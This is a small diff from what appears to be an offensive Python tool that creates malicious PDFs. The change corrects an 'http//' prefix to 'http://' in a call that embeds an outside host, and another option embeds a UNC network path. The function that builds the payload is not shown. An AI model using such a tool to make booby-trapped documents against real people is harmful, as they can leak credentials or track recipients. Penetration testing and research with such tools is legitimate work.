@@ -130,7 +130,7 @@ if __name__ == "__main__":
             create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
         elif method == '2':
-            create_malpdf(filename, 'http//' + host + '/')
+            create_malpdf(filename, 'http://' + host + '/')
 
         else:
             print ("Please choose a valid option")
